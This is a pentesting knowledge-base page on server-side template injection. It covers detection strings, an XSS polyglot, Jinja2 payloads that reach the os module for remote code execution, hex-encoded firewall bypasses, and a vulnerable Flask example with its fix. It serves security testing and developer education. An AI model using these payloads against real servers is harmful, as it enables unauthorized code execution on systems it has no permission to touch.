---
authors: ShutdownRepo, p0dalirius, Fantabc
category: web
---

# 🛠️ SSTI (Server-Side Template Injection)

## Theory

Some web applications rely on template engines to offer dynamic content. When user inputs are embedded in templates, without proper sensitization, the web apps can be vulnerable to SSTIs (Server-Side Template Injections). This is a critical vulnerability that can sometimes lead to Sensitive Information Disclosure, Local File Disclosure and even RCE (Remote Code Execution).

## Practice

Testers need to identify input vectors (parts of the app that accept content from the users) that might be embedded in templates.

The following payload is used for testing [SQL injections](../../web/inputs/sqli.md), [XSS (Cross-Site Scripting)](../../web/inputs/xss.md) and SSTI (Server-Side Template Injection). The <code>&#123;&#123;7*7&#125;&#125;</code> should be interpreted and changed to `49` by **Jinja2** and **Twig** engines.

```html
'"<svg/onload=prompt(5);>{{7*7}}
```

The following injection methodology can be used to identify the template engine. Is the content modified?

Depending on the template engine in use, testers will be able to fully exploit the SSTI vulnerability.

> [!TIP]
> Many template engines offer a sandboxed mode for intentional template injection (to offer rich functionalities). A server-side template injection can sometimes be a feature and not a vulnerability.

## Creating a payload from scratch

After finding a vulnerable field with a basic payload, the attacker still needs to exploit it. The next step is to find a variable that can be used to access classes, variables or modules to run shell commands and get a RCE. The variables to search for depends on the detected render engine. For example, **Jinja2** has the `request` variable, it may be a good idea to try it first.

If no variable is found, there are always the default string constructor (`''`), the default array constructor (`[]`), the default object constructor (`{}`), etc, to start with.

Whether a variable has been found or using a default constructor, there are 2 main ways to create a payload :

- Reading the source code of the variable / default constructor on Github
- Try it on the fly on a local machine and explore all the properties and methods

To speed up the process, it is often easier to start searching from the result : finding a piece of code in the code base where it is possible to run shell commands and then exploring all the properties and methods of the variable / default constructor to reach this first piece of code.

Searching a payload from scratch is a long way to find a RCE but, unless someone on the Internet already shared a payload, there is no better way to do so.

## Example

> [!NOTE]
> The following example will use Jinja2 as the render engine. However, the method is the same with every render engine.

If the server is known to use Python, chances are it might use **Jinja2** as well to render the HTML. To check if an input is vulnerable to a SSTI, use the following payload :

```py
{{ 7*7 }}
```

Multiple payloads can then be used to get a RCE. To perform a RCE, the goal is to retrieve the `os` module one way or another to execute shell commands from there.

Using the already imported `os` module :

```py
{{ os.popen('id').read() }}
```

Using the `request` variable :

```py
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Context independant payloads to get the `os` module by **[Podalirius](https://podalirius.net/fr/articles/python-vulnerabilities-code-execution-in-jinja-templates/)** :

```py
{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os }}
```

## WAF bypass

The web application may be under a **Web Application Firewall**, protecting a SSTI from abusing the server. However, there are a lot of creative way to bypass its restrictions.

### Bypass `.`

In some language, a property or a method is accessible with brackets, for example :

```js
variable.property == variable['property']
```

Using this is a common way to bypass the `.` filter.

### Bypass `_` and other special property symbols

By combining the previous method with this one, WAF characters blacklist can be bypassed using hexadecimal encoding :

```py
# \x5f is equal to _
{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}
```

Or with the full payload encoded :

```py
# This payload is the same than the previous one
{{ request['\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e']['\x5f\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5f\x5f']['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f']('\x6f\x73')['\x70\x6f\x70\x65\x6e']('\x69\x64')['\x72\x65\x61\x64']() }}
```

## Securing the app as a developer

When programming, it might be useful to know what the code behind a SSTI looks like. The following example uses a Python Flask server running with Jinja2 for easier understanding. However, the concept is the same with every language.

Here is a vulnerable source code.

```py
from flask import Flask, request, render_template_string

# Create the app
app = Flask(__name__)

# Home route
@app.route('/')
def home():
    if request.args.get('user'):
        # Render the 'user' argument
        return render_template_string('Welcome ' + request.args.get('user'))
    else:
        # Default page
        return render_template_string('Hello World!')
```

An attacker can perform a SSTI with the URL :

```
http://<server>/?user={{7*7}}  // Plain text
http://<server>/?user=%7B%7B7*7%7D%7D  // URL encoded
```

The template will then render with the response `Welcome 49`.

To fix the problem, the developer should avoid rendering user input. To include user input in the template, the developer should use variable parameters like the following example.

```py
@app.route('/')
def home():
    if request.args.get('user'):
        return render_template_string('Welcome {{ username }}', username=request.args.get('user'))
    else:
        ...
```

Sometimes, it is not possible due to business conditions. One other way is to add a blacklist with all sensible characters and use a sandboxed environment. However, adding a blacklist is not the most popular option, as it can be easily bypassed.

## Resources

[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

[https://podalirius.net/fr/articles/python-vulnerabilities-code-execution-in-jinja-templates/](https://podalirius.net/fr/articles/python-vulnerabilities-code-execution-in-jinja-templates/)

[https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)